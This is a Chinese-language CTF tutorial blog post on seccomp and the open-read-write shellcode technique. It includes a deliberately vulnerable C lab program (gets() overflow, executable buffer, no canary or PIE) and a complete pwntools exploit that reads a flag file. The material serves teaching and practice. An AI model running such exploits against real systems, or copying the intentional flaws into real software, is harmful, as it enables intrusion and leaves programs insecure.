---
title: "Day19－Shellcode Bonus－ORW"
date: 2024-10-03
draft: false
tags: ["iron-man-2024", "pwn", "2024"]
categories: ["security-research"]
author: "YJK"
showToc: true
TocOpen: false
---


## [Lab 網址](https://github.com/YJK0805/PWN-CTF-note/)

## 前言

今天我們將介紹一些簡單的知識，並在最後提供一個練習 Lab。看完前面的內容，大家可能會想：「如果我們可以調用 `execve`，那是否就能拿到 shell 呢？」這確實沒錯，但還有一種方法可以防止使用者調用 `execve` 系統呼叫 (syscall)，這就是 `seccomp` 的機制。

## Seccomp (secure computing mode)

`seccomp` 是 Linux 核心用來禁用特定系統呼叫的機制，透過 `Seccomp BPF` 可以設定對某些 syscall 的過濾規則。例如，可以限制 `execve`，甚至 `open`、`read`、`write` 等等。

但在實作這些規則後，逆向工程的過程可能變得不直觀且困難理解。為了簡化分析，`one gadget` 工具的作者還開發了一個工具，叫做 `seccomp-tools`，非常適合這類情況。

## [seccomp-tools](https://github.com/david942j/seccomp-tools)

**筆者提供的環境中已經安裝了該工具**

這個工具能分析程式的 `seccomp` 規則，並將結果轉換成直觀的 `if-else` 形式的 pseudo code。這讓我們能輕鬆看出程式允許或限制了哪些 syscall，非常適合處理複雜的 `seccomp` 規則。

使用方式如下：

```bash
seccomp-tools dump ./[binary]
```

![image](/images/iron2024/day19_image1.png)

## Lab

查看以下原始碼：

```c
#include <stdio.h>
#include <sys/mman.h>
#include <unistd.h>
#include "seccomp-bpf.h"

void apply_seccomp() {
    struct sock_filter filter[] = {
        VALIDATE_ARCHITECTURE,
        EXAMINE_SYSCALL,
        ALLOW_SYSCALL(read),
        ALLOW_SYSCALL(write),
        ALLOW_SYSCALL(open),
        KILL_PROCESS,
    };

    struct sock_fprog prog = {
        .len = (unsigned short)(sizeof(filter) / sizeof(struct sock_filter)),
        .filter = filter,
    };

    if (prctl(PR_SET_NO_NEW_PRIVS, 1, 0, 0, 0)) {
        perror("Seccomp Error");
        exit(1);
    };
    if (prctl(PR_SET_SECCOMP, SECCOMP_MODE_FILTER, &prog)) {
        perror("Seccomp Error");
        exit(1);
    };
}
char shellcode[0x100];
int main() {
    setvbuf(stdin, 0, 2, 0);
    setvbuf(stdout, 0, 2, 0);
    setvbuf(stderr, 0, 2, 0);
    unsigned long addr = (unsigned long)&shellcode & ~0xfff;
    mprotect((void *)addr, 0x1000, PROT_EXEC | PROT_READ | PROT_WRITE);
    apply_seccomp();
    printf("I add new rule to prevent you from using system().\n");
    printf("Give me shellcode: ");
    read(0, shellcode, 0x100);
    printf("Overflow me: ");
    char buffer[0x10];
    gets(buffer);
    printf("Bye!\n");
    return 0;
}
```

使用以下指令進行編譯：

```bash
gcc src/orw.c -o ./orw/share/orw -fno-stack-protector -no-pie
```

## writeup

可以發現程式將 `shellcode` 陣列的位置修改為可讀、可寫、可執行，並且在程式中允許使用者輸入 shellcode。程式中最關鍵的是 `gets` 的 buffer overflow 且沒有開啟 PIE 與 Canary，這讓我們能夠控制 return address。再者，程式使用了 `Seccomp` 規則，只允許 `open`、`read`、`write` 這三個 syscall，因此我們無法使用 `execve` 獲取 shell。此時我們可以透過 `seccomp-tools` 來確認。

![image](/images/iron2024/day19_image2.png)

換個角度思考，我們獲取 shell 的目的是為了拿到 flag。程式允許我們開啟檔案、讀取檔案並輸出內容，因此如果知道 flag 的位置，我們可以直接開檔讀取並輸出，如此即可拿到 flag。接下來我們需要確認幾件事：

- flag 檔案的位置
- 如何開啟、讀取、輸出檔案
- shellcode 的位置

首先，讓我們查看提供的檔案目錄：

![image](/images/iron2024/day19_image3.png)

從 `Dockerfile` 開始分析，會發現 Docker 創建了 `ubuntu:22.04` 的容器，並且設定了與網路服務相關的 `xinetd`。從目錄結構可以推測 flag 位於 `/home/orw/flag`。

```dockerfile
FROM ubuntu:22.04
LABEL org.opencontainers.image.authors="YJK"
RUN apt-get update
RUN apt-get install xinetd -y
RUN useradd -m orw
RUN chown -R root:root /home/orw
RUN chmod -R 755 /home/orw
CMD ["/usr/sbin/xinetd", "-dontfork"]
```

以下是負責此題的 `docker-compose.yml`，可以看到 `orw/share` 被掛載到容器的 `/home/orw`，因此 flag 的位置應該是 `/home/orw/flag`。

```yml=
orw:
    build: ./orw
    volumes:
      - ./orw/share:/home/orw:ro
      - ./orw/xinetd:/etc/xinetd.d/orw:ro
    ports:
      - "10010:10005"
```

接下來，我們可以透過 `pwntools` 的 `shellcraft` 來生成可以開啟 `/home/orw/flag` 並讀取其內容的 shellcode。

以下程式就會生成可以使用來開啟 `/home/orw/flag` 再讀檔並輸出到 stdin 的 shellcode，那基本上這段程式的執行大概會是先將 `'/home/orw/flag'` 字串放到 stack，並且再透過 `open` 將 `rsp` 的內容，也就是剛剛放入 stack 的檔案路徑打開，並且後面的兩個 0 是作為設定開檔模式與設定權限的部分，再來透過 `read` 將 `rsp` 指向的檔案讀取並儲存，`rax` 是用來讀取檔案，再來透過 `write` 將 `rsp` 剛剛讀取並存入的內容輸出，並且前面的 1 為設定為 stdin，在此時即可以看到檔案內容

```python
shellcode = b""

shellcode += asm(shellcraft.pushstr('/home/orw/flag'))
shellcode += asm(shellcraft.open('rsp', 0, 0))
shellcode += asm(shellcraft.read('rax', 'rsp', 0x100))
shellcode += asm(shellcraft.write(1, 'rsp', 0x100))
```

最後，我們需要確認溢出的 padding 和跳轉的地址。可以使用 `nm` 確定 shellcode 的地址。

![image](/images/iron2024/day19_image4.png)

使用 `objdump` 可以發現輸入從 `rbp-0x20` 開始，因此我們需要填充 0x20+0x8 的資料，然後跳轉到 shellcode。

![image](/images/iron2024/day19_image5.png)

完整 exploit：

```python
from pwn import *
context.arch = 'amd64'
# r = process('../orw/share/orw')
r = remote('127.0.0.1', 10010)

shellcode = b""

shellcode += asm(shellcraft.pushstr('/home/orw/flag'))
shellcode += asm(shellcraft.open('rsp', 0, 0))
shellcode += asm(shellcraft.read('rax', 'rsp', 0x100))
shellcode += asm(shellcraft.write(1, 'rsp', 0x100))

r.sendlineafter(b': ', shellcode)
payload = b'A' * (0x20 + 8) + p64(0x4040a0)
r.sendlineafter(b': ', payload)
r.recvuntil(b'!\n')
r.interactive()
```

solved!!!

![image](/images/iron2024/day19_image6.png)
